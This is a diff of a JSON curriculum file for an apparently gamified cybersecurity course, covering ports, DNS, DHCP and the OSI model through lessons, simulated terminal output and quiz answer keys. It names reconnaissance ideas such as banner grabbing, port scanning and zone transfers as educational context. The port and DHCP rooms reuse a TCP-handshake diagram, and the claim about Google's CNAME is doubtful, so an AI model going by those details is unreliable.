-    "prerequisites": "Room 09 (TCP/IP & Packets)",
-    "whyAreYouHere": "Humans remember names like `endlessus.in` or `google.com`, but routers and switches only understand numerical IP addresses like `104.21.55.2`. How does your computer bridge that gap in a fraction of a millisecond? That is the job of **DNS**, the phonebook of the Internet. In this room, you will learn how DNS resolution works and how **DHCP** automatically configures your device the instant you join a network.",
+    "prerequisites": "Room 24: TCP vs UDP & The 3-Way Handshake",
+    "whyAreYouHere": "An IP address identifies a computer, but a server runs dozens of programs at the same time: a web server, an email server, an SSH terminal server, and a database. How does the server know which incoming packet belongs to which application? Through **Port Numbers**. In this room, you will learn the port hierarchy and memorize the essential ports every cybersecurity practitioner must know.",
     "objectives": [
-      "Understand what the Domain Name System (DNS) does and how it resolves names to IPs",
-      "Learn the core DNS record types: A (IPv4), AAAA (IPv6), CNAME (Alias), MX (Mail), and TXT (Verification)",
-      "Understand Recursive Resolvers, Root Nameservers, and Authoritative Nameservers",
-      "Understand the DHCP 4-step DORA process (Discover, Offer, Request, Acknowledge)",
-      "Query DNS records in the terminal using `dig`"
+      "Understand what a port number is (0 to 65,535) and how it directs traffic to applications",
+      "Learn the 3 port ranges: Well-Known (0-1023), Registered (1024-49151), and Dynamic/Ephemeral (49152-65535)",
+      "Memorize the essential well-known service ports: SSH (22), HTTP (80), HTTPS (443), DNS (53), SMB (445), RDP (3389)",
+      "Understand Socket pairs: combining IP Address + Port Number (e.g. `192.168.1.10:443`)",
+      "Identify open ports using `ss` and `nmap`"
+    ],
+    "vocabulary": [
+      {
+        "term": "Port Number",
+        "definition": "A 16-bit integer (0 to 65535) in transport layer headers that identifies a specific application endpoint or service on a host."
+      },
+      {
+        "term": "Well-Known Ports (0-1023)",
+        "definition": "Standard ports reserved for core system services and protocols (requires administrative privileges to bind on Unix)."
+      },
+      {
+        "term": "Ephemeral Ports (49152-65535)",
+        "definition": "Short-lived temporary ports assigned dynamically by the operating system for client outbound connections."
+      },
+      {
+        "term": "Socket",
+        "definition": "The combination of an IP address and a Port number (e.g. 10.10.20.15:22) identifying a unique communication endpoint."
+      },
+      {
+        "term": "Banner Grabbing",
+        "definition": "The reconnaissance technique of connecting to a network port and reading the welcoming text banner sent by the service to identify its software version."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. What is a Port?",
+        "content": "Think of an IP address as the street address of an apartment complex, and the **Port Number** as the individual apartment unit number. Even though all mail goes to the same building, unit 22 gets SSH mail, unit 80 gets web mail, and unit 53 gets DNS mail!\n\nThere are **65,536 total ports** ($2^{16}$), divided into:\n\u2022 **Well-Known Ports (0 - 1023)**: Standardized services.\n\u2022 **Registered Ports (1024 - 49151)**: Vendor services (e.g. MySQL port 3306).\n\u2022 **Dynamic / Ephemeral Ports (49152 - 65535)**: Random outbound client ports."
+      },
+      {
+        "title": "2. The Essential Security Ports Cheatsheet",
+        "content": "Memorize these critical ports for all cybersecurity exams and real-world testing:\n\n| Port | Protocol | Service | Purpose |\n|---|---|---|---|\n| **21** | TCP | FTP | File Transfer Protocol (Plain-text credentials!) |\n| **22** | TCP | SSH | Secure Shell encrypted remote administration |\n| **23** | TCP | Telnet | Obsolete unencrypted remote shell |\n| **25** | TCP | SMTP | Simple Mail Transfer Protocol (email sending) |\n| **53** | TCP/UDP | DNS | Domain Name System address resolution |\n| **80** | TCP | HTTP | Hypertext Transfer Protocol (unencrypted web) |\n| **443** | TCP | HTTPS | HTTP Secure over TLS encryption |\n| **445** | TCP | SMB | Windows Server Message Block file/printer sharing |\n| **3389** | TCP | RDP | Microsoft Remote Desktop Protocol |"
+      },
+      {
+        "title": "3. Sockets: IP + Port",
+        "content": "A network connection is uniquely defined by a pair of sockets:\n\n`[Client IP : Ephemeral Port] <=====> [Server IP : Service Port]`\n\nExample:\n`192.168.1.45:51240 <=====> 104.21.75.12:443`\nYour browser picks dynamic client port `51240` to talk to HTTPS port `443` on the server."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Banner Grabbing with netcat (nc)",
+        "codeOrDiagram": "cadet@endlessus:~$ nc -vn 10.10.20.15 21\n(UNKNOWN) [10.10.20.15] 21 (ftp) open\n220 (vsFTPd 3.0.3)\n\n[+] Service Identified: vsFTPd version 3.0.3 running on port 21!",
+        "explanation": "Connecting to port 21 via `nc` returns the FTP service version string directly in the banner."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ss -tln` to inspect listening TCP sockets with the modern socket statistics utility:",
+      "initialCommand": "",
+      "expectedCommand": "ss -tln",
+      "simulatedOutput": "State      Recv-Q Send-Q Local Address:Port               Peer Address:Port\nLISTEN     0      128          0.0.0.0:22                      0.0.0.0:*\nLISTEN     0      511          0.0.0.0:80                      0.0.0.0:*\n[+] Sockets displayed: Port 22 (SSH) and Port 80 (HTTP) are listening.",
+      "explanation": "`ss` is the modern replacement for `netstat`."
+    },
+    "questions": [
+      {
+        "id": "q-25-1",
+        "type": "exact",
+        "question": "Which port number is universally used for encrypted HTTPS web traffic?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "443"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Three digits: 443.",
+        "explanation": "Port 443 is the standard port for HTTPS."
+      },
+      {
+        "id": "q-25-2",
+        "type": "exact",
+        "question": "Which port is used by Secure Shell (SSH) for encrypted Linux remote administration?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          "22"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Two digits: 22.",
+        "explanation": "Port 22 is the standard port for SSH."
+      },
+      {
+        "id": "q-25-3",
+        "type": "multiple-choice",
+        "question": "What is the total number of TCP and UDP port numbers available per IP address?",
+        "options": [
+          "1,024",
+          "65,536",
+          "4,096",
+          "16,777,216"
+        ],
+        "correctIndex": 1,
+        "hint": "2 to the 16th power.",
+        "explanation": "Port numbers are 16-bit integers, giving 65,536 total ports (0 to 65535)."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect listening sockets with ss",
+        "instruction": "Execute `ss -tln` in the terminal.",
+        "hints": [
+          "Type: `ss -tln`"
+        ]
+      }
+    ],
+    "securityConnection": "Port scanning (using Nmap) is the foundation of network reconnaissance. Finding an open, unhardened port 445 (SMB) or an ancient port 23 (Telnet) provides penetration testers with immediate initial attack vectors.",
+    "id": "room-25",
+    "nextRoomId": "room-26"
+  },
+  {
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "DNS & Domain Name Resolution",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 25: Ports & Common Network Services",
+    "whyAreYouHere": "Humans remember names (`endlessus.in`), but computers communicate using numbers (`104.21.75.12`). The Domain Name System (DNS) is the global decentralized phonebook of the internet. In this room, you will learn how DNS resolution works step-by-step from root servers down to authoritative name servers, understand common DNS record types (A, AAAA, CNAME, MX), and perform lookups using `nslookup` and `dig`.",
+    "objectives": [
+      "Understand why DNS is required to bridge human domain names and machine IP addresses",
+      "Trace the 4 steps of recursive DNS resolution: Resolver -> Root Server -> TLD Server -> Authoritative DNS",
+      "Learn essential DNS record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (verification)",
+      "Query DNS records from the terminal using `nslookup` and `dig`",
+      "Understand DNS cache poisoning and spoofing vulnerabilities"
     ],
     "vocabulary": [
       {
         "term": "DNS (Domain Name System)",
-        "definition": "The distributed hierarchical database system that translates human-readable domain names into numerical IP addresses."
+        "definition": "A hierarchical decentralized naming system that translates human-friendly domain names into numerical IP addresses."
       },
       {
         "term": "A Record",
-        "definition": "A DNS record that maps a domain name directly to an IPv4 address (e.g. `endlessus.in` -> `185.199.108.153`)."
+        "definition": "An Address record that maps a domain name directly to a 32-bit IPv4 address."
       },
       {
-        "term": "AAAA Record",
-        "definition": "A DNS record that maps a domain name to an IPv6 address."
+        "term": "CNAME (Canonical Name)",
+        "definition": "An alias record that redirects one domain name to another domain name."
       },
       {
-        "term": "CNAME Record",
-        "definition": "Canonical Name record: an alias that points one domain name to another domain name."
+        "term": "MX (Mail Exchange)",
+        "definition": "Specifies the mail servers responsible for accepting incoming emails on behalf of a domain."
       },
       {
-        "term": "MX Record",
-        "definition": "Mail Exchange record: specifies the mail servers responsible for accepting email on behalf of a domain."
-      },
-      {
-        "term": "DHCP (Dynamic Host Configuration Protocol)",
-        "definition": "A network protocol that automatically assigns IP addresses, subnet masks, and default gateways to joining devices."
+        "term": "Authoritative Name Server",
+        "definition": "The definitive server that holds the actual DNS records for a specific domain name zone."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 170\" width=\"100%\" height=\"170\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"20\" y=\"55\" width=\"120\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"80\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Your Browser</text>\n  <text x=\"80\" y=\"100\" fill=\"#94a3b8\" font-size=\"10\" text-anchor=\"middle\">endlessus.in?</text>\n\n  <path d=\"M 140 85 L 220 85\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"220,85 210,80 210,90\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"220\" y=\"30\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"60\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">DNS Resolver (53)</text>\n  <text x=\"300\" y=\"80\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">1. Root Server (.)</text>\n  <text x=\"300\" y=\"100\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">2. TLD Server (.in)</text>\n  <text x=\"300\" y=\"120\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">3. Authoritative DNS</text>\n\n  <path d=\"M 380 85 L 450 85\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"450,85 440,80 440,90\" fill=\"#10b981\"/>\n\n  <rect x=\"450\" y=\"55\" width=\"130\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"515\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server</text>\n  <text x=\"515\" y=\"100\" fill=\"#f59e0b\" font-size=\"10\" text-anchor=\"middle\">104.21.75.12</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The 4-Step DNS Hierarchy",
-        "content": "When you type a domain into your browser:\n1. **Local / Recursive Resolver** (e.g., your ISP or Cloudflare `1.1.1.1`): Checks if the answer is in cache.\n2. **Root Nameservers (`.`)**: Directs the query to the Top-Level Domain (TLD) servers.\n3. **TLD Nameservers (`.in` or `.com`)**: Directs the query to the domain's Authoritative Nameserver.\n4. **Authoritative Nameserver**: Holds the true, official DNS records and returns the final IP address."
+        "title": "1. The 4 Steps of DNS Resolution",
+        "content": "When you type `endlessus.in` into your browser, what happens?\n\n1. **Recursive Resolver**: Your browser asks your local ISP or public resolver (`8.8.8.8` / `1.1.1.1`).\n2. **Root Server (`.`)**: If not cached, the resolver asks one of the 13 global Root Servers: *\"Where is `.in`?\"* The root server points to the `.in` TLD server.\n3. **TLD Server (`.in`)**: The Top-Level Domain server replies: *\"The authoritative name server for `endlessus.in` is Cloudflare!\"*\n4. **Authoritative Name Server**: Cloudflare answers with the final record: *\"`endlessus.in` is at IP `104.21.75.12`!\"*\n\nYour browser caches this answer and connects directly to `104.21.75.12` on port 443!"
       },
       {
-        "title": "2. DHCP: The DORA Process",
-        "content": "When your phone joins a Wi-Fi network, how does it get an IP address without manual configuration?\n• **Discover**: Phone broadcasts: *\"Is there a DHCP server here? I need an address!\"*\n• **Offer**: Router replies: *\"I have 192.168.1.105 available for you.\"*\n• **Request**: Phone answers: *\"Great, I would like to lease 192.168.1.105.\"*\n• **Acknowledge**: Router confirms: *\"Lease granted! Your gateway is 192.168.1.1 and DNS is 1.1.1.1.\"*"
+        "title": "2. Essential DNS Record Types",
+        "content": "\u2022 **A Record**: Points a hostname to an **IPv4** address (`endlessus.in` -> `104.21.75.12`).\n\u2022 **AAAA Record**: Points a hostname to a 128-bit **IPv6** address.\n\u2022 **CNAME Record**: An **alias**. `www.google.com` is a CNAME pointing to `google.com`.\n\u2022 **MX Record**: Defines mail servers for email delivery.\n\u2022 **TXT Record**: Plain text data. Widely used for security verification: SPF (Sender Policy Framework) and DKIM to prevent email phishing and spoofing!"
+      },
+      {
+        "title": "3. Querying DNS with nslookup and dig",
+        "content": "Security analysts inspect DNS using command-line utilities:\n\n\u2022 **`nslookup [domain]`**: Simple cross-platform lookup tool.\n\u2022 **`dig [domain] [type]`**: Detailed Unix diagnostic tool (Domain Information Groper):\n  `dig endlessus.in A`\n  `dig endlessus.in MX` (checks mail servers)."
       }
     ],
     "seeExamples": [
       {
-        "title": "Querying DNS Records with dig",
-        "codeOrDiagram": "cadet@endlessus:~$ dig endlessus.in +short\n185.199.108.153\n185.199.109.153\n185.199.110.153\n185.199.111.153\n\ncadet@endlessus:~$ dig endlessus.in MX +short\n10 mail.endlessus.in.",
-        "explanation": "`dig` (Domain Information Groper) is the ultimate tool for security analysts to query DNS infrastructure."
+        "title": "Querying DNS with nslookup",
+        "codeOrDiagram": "cadet@endlessus:~$ nslookup endlessus.in\nServer:         1.1.1.1\nAddress:        1.1.1.1#53\n\nNon-authoritative answer:\nName:   endlessus.in\nAddress: 104.21.75.12",
+        "explanation": "`nslookup` resolves `endlessus.in` to IP `104.21.75.12` via DNS port 53."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Query the official IPv4 address of `endlessus.in` using `dig endlessus.in +short`:",
+      "prompt": "Run `nslookup endlessus.in` in the terminal to resolve the domain to its IPv4 address:",
       "initialCommand": "",
-      "expectedCommand": "dig endlessus.in +short",
-      "simulatedOutput": "185.199.108.153\n185.199.109.153\n185.199.110.153\n185.199.111.153\n[+] Success! Resolved 4 GitHub Pages Anycast IPv4 A-records.",
-      "explanation": "The query returned the four global Anycast IP addresses serving the static website."
+      "expectedCommand": "nslookup endlessus.in",
+      "simulatedOutput": "Server:         1.1.1.1\nAddress:        1.1.1.1#53\n\nNon-authoritative answer:\nName:   endlessus.in\nAddress: 104.21.75.12\n[+] DNS Resolution verified: endlessus.in maps to 104.21.75.12 via port 53.",
+      "explanation": "`nslookup` contacts the configured DNS resolver on port 53."
     },
     "questions": [
       {
-        "id": "r10-q1",
-        "type": "multiple-choice",
-        "question": "Which DNS record type is responsible for mapping a domain name to a standard 32-bit IPv4 address?",
-        "options": [
-          "MX Record",
-          "CNAME Record",
-          "A Record",
-          "TXT Record"
+        "id": "q-26-1",
+        "type": "exact",
+        "question": "Which protocol translates human-readable domain names into numerical IP addresses?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "DNS",
+          "Domain Name System"
         ],
-        "correctIndex": 2,
-        "explanation": "The 'A' record (Address record) maps hostnames to IPv4 addresses. The 'AAAA' record maps to IPv6."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Domain Name System abbreviation.",
+        "explanation": "DNS (Domain Name System) resolves domain names to IP addresses."
       },
       {
-        "id": "r10-q2",
-        "type": "multiple-choice",
-        "question": "What is the acronym for the 4-step sequence a device executes with a DHCP server to receive an automatic IP address?",
-        "options": [
-          "DORA (Discover, Offer, Request, Acknowledge)",
-          "SYN, ACK, FIN, RST",
-          "GET, POST, PUT, DELETE",
-          "SCAN, PROBE, IDENTIFY, MAP"
+        "id": "q-26-2",
+        "type": "exact",
+        "question": "Which specific DNS record type maps a domain name directly to an IPv4 address?",
+        "visualSlots": "_",
+        "acceptedAnswers": [
+          "A",
+          "A record"
         ],
-        "correctIndex": 0,
-        "explanation": "DORA: Discover -> Offer -> Request -> Acknowledge."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "The single letter A.",
+        "explanation": "An 'A' record maps hostnames to 32-bit IPv4 addresses."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Query Domain A-Records",
-        "instruction": "Use `dig endlessus.in +short` to resolve the platform's public IP addresses.",
+        "title": "Task 1: Resolve domain with nslookup",
+        "instruction": "Execute `nslookup endlessus.in` in the terminal.",
         "hints": [
-          "Concept: Query DNS servers for A records.",
-          "Direction: Use the standard dig tool with the short flag.",
-          "Tool: `dig`",
-          "Syntax: `dig endlessus.in +short`",
-          "Explanation: Returns IP addresses."
+          "Type: `nslookup endlessus.in`"
         ]
       }
     ],
-    "explainResult": "The `dig` utility constructed a UDP datagram on port 53 containing an RFC 1035 DNS Question section for `endlessus.in IN A`, transmitted it to the system resolver, and unpacked the Answer section.",
-    "securityConnection": "DNS is a prime target for reconnaissance and exploitation. Attackers use 'Subdomain Enumeration' to discover hidden development servers (`dev.company.com`, `admin-portal.company.com`). Additionally, attackers execute 'DNS Spoofing / Cache Poisoning' to redirect banking users to fake phishing websites.",
-    "completion": {
-      "learned": [
-        "How DNS maps domain names to numerical IP addresses",
-        "The hierarchy: Root -> TLD -> Authoritative nameservers",
-        "Core record types: A, AAAA, CNAME, MX, and TXT",
-        "How DHCP's DORA process assigns network addresses"
-      ],
-      "practiced": [
-        "dig endlessus.in +short",
-        "Resolving domain names",
-        "Understanding DNS answers"
-      ]
-    },
-    "nextRoomId": "room-11"
+    "securityConnection": "Attackers perform 'DNS Zone Transfers' (AXFR) against misconfigured authoritative name servers to dump an entire organization's internal network subdomains, server names, and private IP addresses in seconds!",
+    "id": "room-26",
+    "nextRoomId": "room-27"
   },
   {
-    "id": "room-11",
-    "stage": 3,
-    "stageTitle": "Stage 3 — How the Web Works",
-    "title": "How the Internet Delivers a Website",
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "DHCP & Automatic Address Assignment (DORA)",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "25 min",
-    "prerequisites": "Stage 2 (Networking Fundamentals)",
-    "whyAreYouHere": "You open your browser and type `https://endlessus.in`. Less than one second later, text, buttons, and animations appear on your screen. What actually happened behind the glass during that single second? This room synthesizes everything you've learned so far — DNS, IP routing, TCP handshakes, TLS encryption, and HTTP — into one complete, visually stunning end-to-end journey.",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "20 min",
+    "prerequisites": "Room 26: DNS & Domain Name Resolution",
+    "whyAreYouHere": "Imagine if every time you connected your phone to a coffee shop Wi-Fi network, you had to manually type in an available IP address, subnet mask, default gateway router, and DNS servers. You'd never get online! DHCP (Dynamic Host Configuration Protocol) automates all of this in under half a second through the 4-step DORA process.",
     "objectives": [
-      "Follow the complete 8-step lifecycle of a web request",
-      "Understand URL structure: Scheme, Domain, Port, Path, Query string, and Fragment",
-      "Learn how TLS (Transport Layer Security) encrypts communication over public networks",
-      "Understand the roles of Web Servers, Reverse Proxies, and CDN Edge Nodes",
-      "Inspect the timing breakdown of a live web request"
+      "Understand why dynamic IP address assignment is necessary compared to static addressing",
+      "Master the 4-step DHCP DORA process: Discover, Offer, Request, Acknowledge",
+      "Learn the 4 core configuration parameters provided by DHCP: IP, Subnet Mask, Default Gateway, and DNS Servers",
+      "Understand DHCP Leases and lease renewal cycles",
+      "Recognize DHCP Starvation and Rogue DHCP Server attacks"
+    ],
+    "vocabulary": [
+      {
+        "term": "DHCP (Dynamic Host Configuration Protocol)",
+        "definition": "A network management protocol used to automatically assign IP addresses and network configuration parameters to client devices."
+      },
+      {
+        "term": "DORA",
+        "definition": "The 4-step handshake used by DHCP: Discover (broadcast), Offer (server reply), Request (client selection), and Acknowledge (server confirmation)."
+      },
+      {
+        "term": "DHCP Lease",
+        "definition": "The temporary duration for which a client is permitted to use an assigned IP address before needing to renew it."
+      },
+      {
+        "term": "Rogue DHCP Server",
+        "definition": "An unauthorized DHCP server deployed by an attacker on a LAN to hand out malicious DNS server IPs and default gateways to clients."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The 4 Steps of DHCP: DORA",
+        "content": "When a new device connects to a network without an IP, it executes the **DORA** sequence:\n\n1. **D - Discover**: Client broadcasts to `255.255.255.255`: *\"Is there a DHCP server here? I need an IP!\"*\n2. **O - Offer**: DHCP server hears the broadcast and replies: *\"I have `192.168.1.55` available for you with mask `255.255.255.0`!\"*\n3. **R - Request**: Client broadcasts: *\"Thank you! I formally request to lease `192.168.1.55`.\"*\n4. **A - Acknowledge**: DHCP server sends final confirmation: *\"Acknowledged! `192.168.1.55` is yours for 24 hours. Your gateway is `192.168.1.1` and your DNS is `1.1.1.1`!\"*"
+      },
+      {
+        "title": "2. The 4 Things DHCP Gives You",
+        "content": "Without all four of these settings, a computer cannot use the internet:\n\n1. **Your IP Address** (e.g. `192.168.1.55`): Your unique identity.\n2. **Your Subnet Mask** (e.g. `255.255.255.0`): Identifies local vs remote targets.\n3. **Your Default Gateway** (e.g. `192.168.1.1`): The router that connects you to the outside world.\n4. **Your DNS Servers** (e.g. `1.1.1.1`): Resolves website domain names to IPs."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Inspecting DHCP Lease Status",
+        "codeOrDiagram": "cadet@endlessus:~$ ip route\ndefault via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.55 metric 100",
+        "explanation": "Notice the `proto dhcp` flag indicating that the default gateway and IP were dynamically assigned by DHCP."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo \"D-O-R-A: Discover, Offer, Request, Acknowledge\"` to test the DHCP sequence:",
+      "initialCommand": "",
+      "expectedCommand": "echo \"D-O-R-A: Discover, Offer, Request, Acknowledge\"",
+      "simulatedOutput": "D-O-R-A: Discover, Offer, Request, Acknowledge\n[+] DHCP handshake steps verified.",
+      "explanation": "DORA summarizes the 4 exchange messages in DHCP."
+    },
+    "questions": [
+      {
+        "id": "q-27-1",
+        "type": "exact",
+        "question": "What 4-letter acronym represents the four steps in the DHCP address assignment process?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "DORA"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Discover, Offer, Request, Acknowledge.",
+        "explanation": "DORA stands for Discover, Offer, Request, Acknowledge."
+      },
+      {
+        "id": "q-27-2",
+        "type": "multiple-choice",
+        "question": "What security risk occurs when an attacker launches a Rogue DHCP server on a local corporate network?",
+        "options": [
+          "The attacker can assign themselves as the default gateway and DNS server, intercepting all client traffic (Man-in-the-Middle)",
+          "The attacker instantly burns out the switch power supplies",
+          "The attacker forces all computers to format their hard drives",
+          "The attacker reverses the CPU clock frequency"
+        ],
+        "correctIndex": 0,
+        "hint": "Controlling gateway and DNS allows traffic interception.",
+        "explanation": "A rogue DHCP server hands out malicious gateway and DNS settings to hijack and monitor traffic."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Verify DORA sequence",
+        "instruction": "Run `echo \"D-O-R-A: Discover, Offer, Request, Acknowledge\"` in the terminal.",
+        "hints": [
+          "Type: `echo \"D-O-R-A: Discover, Offer, Request, Acknowledge\"`"
+        ]
+      }
+    ],
+    "securityConnection": "Enterprise switches use a defensive feature called **DHCP Snooping** to block rogue DHCP attacks: only switch ports designated by administrators as 'trusted' (where legitimate DHCP servers live) are allowed to send DHCP Offer and Ack packets.",
+    "id": "room-27",
+    "nextRoomId": "room-28"
+  },
+  {
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "The OSI & TCP/IP Models & Network Troubleshooting",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 27: DHCP & Address Assignment",
+    "whyAreYouHere": "The OSI (Open Systems Interconnection) 7-Layer model and the 4-Layer TCP/IP model are the universal conceptual roadmaps of networking. Every security tool, attack vector, and defensive firewall operates at a specific layer. In this room, you will learn all 7 layers, understand data encapsulation/decapsulation, and use `ping` and `traceroute` for systematic network troubleshooting.",
+    "objectives": [
+      "Memorize the 7 Layers of the OSI Model from Physical (Layer 1) to Application (Layer 7)",
+      "Map the 4 layers of the TCP/IP model to the 7 OSI layers",
+      "Understand Encapsulation (adding headers) and Decapsulation (stripping headers)",
+      "Understand Protocol Data Units (PDUs): Bits, Frames, Packets, Segments, and Data",
+      "Troubleshoot connectivity systematically from Layer 1 to Layer 7 using `ping` and `traceroute`"
+    ],
+    "vocabulary": [
+      {
+        "term": "OSI 7-Layer Model",
+        "definition": "A conceptual framework developed by ISO characterizing the functions of a telecommunication system into 7 distinct abstraction layers."
+      },
+      {
+        "term": "Encapsulation",
+        "definition": "The process of wrapping data with protocol headers as it travels down the protocol stack (Data -> Segment -> Packet -> Frame -> Bits)."
+      },
+      {
+        "term": "PDU (Protocol Data Unit)",
+        "definition": "The specific unit of data transferred at a given layer (Layer 1: Bits, Layer 2: Frames, Layer 3: Packets, Layer 4: Segments)."
+      },
+      {
+        "term": "ping (ICMP)",
+        "definition": "A network administration tool used to test reachability of a host using ICMP Echo Request and Echo Reply packets."
+      },
+      {
+        "term": "traceroute",
+        "definition": "A utility that records each router hop along the path between your computer and a destination host by incrementing IP TTL values."
+      }
+    ],
